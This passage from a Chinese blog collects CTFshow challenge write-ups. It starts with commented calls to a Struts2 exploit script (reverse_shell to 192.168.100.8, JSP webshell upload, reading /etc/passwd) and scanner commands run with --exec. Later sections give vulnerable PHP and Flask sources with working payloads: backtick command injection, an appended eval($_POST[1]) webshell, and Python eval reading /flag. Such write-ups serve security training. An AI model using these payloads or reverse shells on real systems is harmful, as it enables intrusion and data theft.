s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.exec_cmd1(&#x27;ls -la&#x27;))</span><br><span class="line"># print(&#x27;---------------------&#x27;)</span><br><span class="line"># print(s.exec_cmd2(&#x27;ls -la&#x27;))</span><br><span class="line"># print(&#x27;---------------------&#x27;)</span><br><span class="line"># print(s.exec_cmd3(&#x27;ls -la&#x27;))</span><br><span class="line"># print(s.upload_shell1(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_019(&quot;http://192.168.100.8:8080/example/HelloWorld.action&quot;)</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_029(&quot;http://192.168.100.8/default.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_032(&quot;http://192.168.100.8:8080/index.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_033(&quot;http://192.168.100.8/orders/3&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_037(&quot;http://192.168.100.8:8080/orders/3/&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_045(&quot;http://192.168.100.8/memoshow.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_046(&quot;http://192.168.100.8/doUpload.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"># s = S2_052(&#x27;http://192.168.100.8/orders/3/edit&#x27;)</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_048(&quot;http://192.168.100.8/integration/saveGangster.action&quot;, data=&#x27;name=&#123;exp&#125;&amp;age=123&amp;__checkbox_bustedBefore=true&amp;description=123&#x27;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_048(&quot;http://192.168.100.8/integration/saveGangster.action&quot;, data=&#x27;name=&#123;exp&#125;&amp;age=123&amp;__checkbox_bustedBefore=true&amp;description=123&#x27;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_053(&quot;http://192.168.100.8&quot;, data=&#x27;name=&#123;exp&#125;&#x27;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_devMode(&quot;http://192.168.100.8/orders&quot;)</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_057(&quot;http://192.168.100.8:8080/showcase/actionChain1.action&quot;)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.exec_cmd(&quot;cat /etc/passwd&quot;))</span><br><span class="line"># s.reverse_shell(&quot;192.168.100.8&quot;, 9999)</span><br></pre></td></tr></table></figure>



<p>试一试，总有一个工具能扫出来。</p>
<h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/桌面/Struts2Scan-main2/Struts2Scan.py -u http://e17352eb-573e-46ab-883c-f4f9c9e0b05a.challenge.ctf.show/S2-007/user.action -n S2-016 --exec</span><br></pre></td></tr></table></figure>

<p>env</p>
<h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/桌面/Struts2Scan-main2/Struts2Scan.py -u http://bacf75dd-e6b8-408f-8dbf-96393355c935.challenge.ctf.show/S2-008/ -n S2-008 --exec</span><br></pre></td></tr></table></figure>

<p>执行env命令即可</p>
<h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/桌面/scanjava -u http://f89ab82b-bf00-4be0-9fff-b4927359e0b0.challenge.ctf.show/S2-009/showcase.jsp  -n S2-008 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p>没扫描出来</p>
<h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/桌面/Struts2Scan-main2/Struts2Scan.py -u http://31827834-612a-41c2-9f06-9d1c6922cc8d.challenge.ctf.show/S2-013/ -n S2-016 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/桌面/scanjava -u http://54a3836e-b43d-4729-9bda-c0c23a1120c1.challenge.ctf.show/S2-015/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/桌面/scanjava -u http://853f6c12-23a7-41ec-b348-b13be3564049.challenge.ctf.show/S2-016/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/桌面/scanjava -u http://d9f873ad-c396-4e2b-b7d4-67cc2985cdfc.challenge.ctf.show/S2-019/example/HelloWorld.action -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/桌面/scanjava -u http://d6d16853-7bbc-4a03-8ade-233139abddc1.challenge.ctf.show/S2-029/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/桌面/scanjava -u http://fe185d70-2910-4b03-b06d-fe4fe6f17e45.challenge.ctf.show/S2-032/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h2>]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-其他</title>
    <url>/2023/05/25/ctfshow%E5%90%88%E9%9B%86-ctfshow-%E5%85%B6%E4%BB%96/</url>
    <content><![CDATA[<h2 id="web396"><a href="#web396" class="headerlink" title="web396"></a>web396</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://`ls`/var/www/html/1.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://`tac fl0g.php`/var/www/html/1.php</span><br></pre></td></tr></table></figure>

<h2 id="web397-web402通杀"><a href="#web397-web402通杀" class="headerlink" title="web397-web402通杀"></a>web397-web402通杀</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;scheme&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/;|&gt;|\||base/i&#x27;</span>, <span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&gt; /tmp/&#x27;</span>.<span class="variable">$url</span>[<span class="string">&#x27;path&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=zhou://`cat%20fl0g.php`/../var/www/html/1.txt</span><br></pre></td></tr></table></figure>

<h2 id="Web407"><a href="#Web407" class="headerlink" title="Web407"></a>Web407</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$ip</span>,FILTER_VALIDATE_IP))&#123;</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cafe</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=cafe::add</span><br></pre></td></tr></table></figure>

<p>查看源码即可看到</p>
<h2 id="web410"><a href="#web410" class="headerlink" title="web410"></a>web410</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">if(filter_var ($b,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    if($b==&#x27;true&#x27; || intval($b)&gt;0)&#123;</span><br><span class="line">        die(&#x27;FLAG NOT HERE&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.w3school.com.cn/php/filter_validate_boolean.asp">PHP FILTER_VALIDATE_BOOLEAN 过滤器 (w3school.com.cn)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?b=yes或者?b=on</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FILTER_VALIDATE_BOOLEAN 过滤器把值作为布尔选项来验证。</span><br><span class="line"></span><br><span class="line">Name: &quot;boolean&quot;</span><br><span class="line">ID-number: 258</span><br><span class="line">可能的返回值：</span><br><span class="line"></span><br><span class="line">如果是 &quot;1&quot;, &quot;true&quot;, &quot;on&quot; 以及 &quot;yes&quot;，则返回 true。</span><br><span class="line">如果是 &quot;0&quot;, &quot;false&quot;, &quot;off&quot;, &quot;no&quot; 以及 &quot;&quot;，则返回 false。</span><br><span class="line">否则返回 NULL。</span><br></pre></td></tr></table></figure>

<h2 id="web411"><a href="#web411" class="headerlink" title="web411"></a>web411</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span> (<span class="variable">$b</span>,FILTER_VALIDATE_BOOLEAN))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="string">&#x27;true&#x27;</span> || <span class="title function_ invoke__">intval</span>(<span class="variable">$b</span>)&gt;<span class="number">0</span> ||<span class="variable">$b</span>==<span class="string">&#x27;on&#x27;</span> || <span class="variable">$b</span>==<span class="string">&#x27;ON&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;FLAG NOT HERE&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?b=yes或?b=On</span><br></pre></td></tr></table></figure>

<h2 id="web412"><a href="#web412" class="headerlink" title="web412"></a>web412</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;//&#x27;</span>.<span class="variable">$ctfshow</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=?&gt;&lt;?php eval($_POST[1]);&amp;1=system(&#x27;cat flag*&#x27;);</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><strong><code>FILE_APPEND</code></strong></th>
<th>如果文件 <code>filename</code> 已经存在，追加数据而不是覆盖。</th>
</tr>
</thead>
</table>
<h2 id="web413"><a href="#web413" class="headerlink" title="web413"></a>web413</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$ctfshow</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>, <span class="string">&#x27;/*&#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;*/&#x27;</span>,FILE_APPEND);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=*/system(&#x27;tac f*&#x27;);/*</span><br></pre></td></tr></table></figure>

<h2 id="web414"><a href="#web414" class="headerlink" title="web414"></a>web414</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>==<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sqrt</span>(<span class="variable">$ctfshow</span>)&gt;=<span class="title function_ invoke__">sqrt</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$flag</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo sqrt(-1);</span><br></pre></td></tr></table></figure>

<p>结果为NAN</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=-1</span><br></pre></td></tr></table></figure>

<h2 id="web415"><a href="#web415" class="headerlink" title="web415"></a>web415</h2><h2 id="web416"><a href="#web416" class="headerlink" title="web416"></a>web416</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;fake flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span> <span class="keyword">extends</span> <span class="title">ctf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title function_ invoke__">show</span>(<span class="variable">$_GET</span>[f]); </span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=ctf::flag</span><br></pre></td></tr></table></figure>

<h2 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h2><p>?ctfshow&#x3D;flag</p>
<h2 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$code = $_POST[&#x27;code&#x27;];</span><br><span class="line">if(strlen($code) &lt; 17)&#123;</span><br><span class="line">    eval($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=eval($_POST[1]);&amp;1=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$code = $_POST[&#x27;code&#x27;];</span><br><span class="line">if(strlen($code) &lt; 8)&#123;</span><br><span class="line">    system($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=nl ../*</span><br></pre></td></tr></table></figure>



<h2 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$code = $_POST[&#x27;code&#x27;];</span><br><span class="line">if(strlen($code) &lt; 6)&#123;</span><br><span class="line">    system($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=nl *</span><br></pre></td></tr></table></figure>



<h2 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$code = $_POST[&#x27;code&#x27;];</span><br><span class="line">if(strlen($code) &lt; 5)&#123;</span><br><span class="line">    system($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=nl *</span><br></pre></td></tr></table></figure>



<h2 id="web423"><a href="#web423" class="headerlink" title="web423"></a>web423</h2><p>源码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def app_index():</span><br><span class="line">    code = request.args.get(&#x27;code&#x27;)</span><br><span class="line">    if code:</span><br><span class="line">    	return eval(code)</span><br><span class="line">    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">os.popen(&#x27;ls /&#x27;).read()</span><br></pre></td></tr></table></figure>

<h2 id="web424"><a href="#web424" class="headerlink" title="web424"></a>web424</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def app_index():</span><br><span class="line">    code = request.args.get(&#x27;code&#x27;)</span><br><span class="line">    if code:</span><br><span class="line">    	return eval(code)</span><br><span class="line">    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>

<p>没有import os</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure>

<h2 id="web425"><a href="#web425" class="headerlink" title="web425"></a>web425</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def app_index():</span><br><span class="line">    code = request.args.get(&#x27;code&#x27;)</span><br><span class="line">    if code:</span><br><span class="line">    	if &#x27;os&#x27; not in code:</span><br><span class="line">    		return eval(code)</span><br><span class="line">    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>

<p>?code&#x3D;open(‘&#x2F;flag’).read()</p>
<h2 id="web426-web431"><a href="#web426-web431" class="headerlink" title="web426-web431"></a>web426-web431</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import re</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def app_index():</span><br><span class="line">    code = request.args.get(&#x27;code&#x27;)</span><br><span class="line">    if code:</span><br><span class="line">    	reg = re.compile(r&#x27;os|popen&#x27;)</span><br><span class="line">    	if reg.match(code)==None:</span><br><span class="line">    		return eval(code)</span><br><span class="line">    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=80)</span><br></pre></td></tr></table></figure>

<p>根据yv师傅blog匹配好像有问题,注意有个空格在前面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code= open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure>

<p>web431</p>
